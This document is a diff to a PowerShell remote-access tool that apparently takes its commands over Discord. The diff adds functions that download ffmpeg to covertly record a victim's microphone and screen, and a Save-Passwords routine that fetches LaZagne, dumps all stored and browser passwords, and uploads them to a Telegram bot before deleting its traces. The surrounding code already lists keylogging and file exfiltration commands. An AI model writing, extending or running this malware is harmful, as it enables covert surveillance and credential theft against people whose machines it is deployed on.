@@ -62,10 +62,13 @@ Extra-Info    : Extra commands information
 Pause-Session   : Kills this session and restarts
 Toggle-Errors    : Toggle error messages to chat
 Folder-Tree    : Gets Dir tree and sends it zipped
-SpeechToText  : Send audio transcript to Discord 
+SpeechToText  : Send audio transcript to Discord
+Record-Audio  : Record microphone to Discord
+Record-Screen  : Record Screen to Discord             
 Screenshot   : Sends a screenshot of the desktop
 Key-Capture    : Capture Keystrokes and send
 Exfiltrate   : Sends files (see 'Extra-Info' for more)
+Save-Passwords : Gather all passwords from computer
 Upload      : Uploads a specific file (use -path)
 System-Info   : Send System info as text file
 Software-Info   : Send Software info as text file
@@ -118,6 +121,9 @@ This Eg. will scan 192.168.1.1 to 192.168.1.254
 ===============  Message Example ===============
 ( PS`> Message 'Your Message Here!' )
 
+================== Record Examples =================
+( Record-Audio -t 100 ) number of seconds to record     
+( Record-Screen -t 100 ) number of seconds to record     
 =============================================="
 Post-Message | Out-Null
 }
@@ -170,6 +176,47 @@ while ($true) {
 }
 }
 
+Function Record-Audio{
+param ([int[]]$t)
+$contents = "$env:COMPUTERNAME $tick Recording Started for $t seconds.."
+Post-Message | Out-Null
+$Path = "$env:Temp\ffmpeg.exe"
+If (!(Test-Path $Path)){  
+$url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
+iwr -Uri $url -OutFile $Path
+}
+sleep 1
+
+Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
+function getFriendlyName($id) {$reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id";return (get-ItemProperty $reg).FriendlyName}
+$id1 = [audio]::GetDefault(1);$MicName = "$(getFriendlyName $id1)"; Write-Output $MicName
+
+$filePath = "$env:Temp\AudioClip.mp3"
+if ($t.Length -eq 0){$t = 10}
+.$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $t -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $filePath
+Post-File
+sleep 1
+rm -Path $filePath -Force
+}
+
+Function Record-Screen{
+param ([int[]]$t)
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+$Path = "$env:Temp\ffmpeg.exe"
+If (!(Test-Path $Path)){  
+$url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
+iwr -Uri $url -OutFile $Path
+}
+sleep 1
+$filePath = "$env:Temp\ScreenClip.mkv"
+if ($t.Length -eq 0){$t = 10}
+.$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $filePath
+Post-File
+sleep 1
+rm -Path $filePath -Force
+}
+
 Function Exfiltrate {
 param ([string[]]$FileType,[string[]]$Path)
 $maxZipFileSize = 50MB
@@ -215,6 +262,60 @@ $zipArchive.Dispose()
 Post-File ;rm -Path $FilePath -Force
 $contents = "$env:COMPUTERNAME $tick Exfiltration Complete!"
 Post-Message | Out-Null
+}
+
+Function Save-Passwords{
+$Output = "C:\temp"
+$ResultFile = "$Output\$env:computername.txt"
+Start-BitsTransfer -Source "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -Destination "$Output/l.exe"
+Set-Location $Output
+Start-Sleep -Milliseconds 15000
+.\l.exe all -vv > "$env:computername.txt"; .\l.exe browsers -vv >> "$env:computername.txt"
+
+try {
+    # Create a byte array from the file
+    $FileStream = [System.IO.File]::OpenRead($ResultFile)
+    $FileBytes = [byte[]]::new($FileStream.Length)
+    $FileStream.Read($FileBytes, 0, $FileBytes.Length)
+    $FileStream.Close()
+
+    # Define the boundary for multipart form-data
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $LF = "`r`n"
+
+    # Construct the multipart form-data content
+    $BodyLines = @(
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"chat_id`"",
+        "",
+        $chatID,
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"document`"; filename=`"$($ResultFile)`"",
+        "Content-Type: application/octet-stream",
+        "",
+        [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($FileBytes),
+        "--$boundary--",
+        ""
+    ) -join $LF
+
+    # Convert the body to a byte array
+    $BodyBytes = [System.Text.Encoding]::GetEncoding("iso-8859-1").GetBytes($BodyLines)
+
+    # Send the request to the Telegram API
+    $TelegramAPI = "https://api.telegram.org/bot$Token/sendDocument"
+    $Response = Invoke-RestMethod -Uri $TelegramAPI -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $BodyBytes
+
+# Send the result file
+Send-TelegramFile -Token $Token -chatID $chatID -FilePath $ResultFile
+
+# Cleanup
+Remove-Item $ResultFile, "$Output/l.exe" -Force -ErrorAction SilentlyContinue
+}
+    catch [System.Exception]
+    {
+        write $_ 
+        return 'test'
+    }
 }
 
 Function Screenshot{
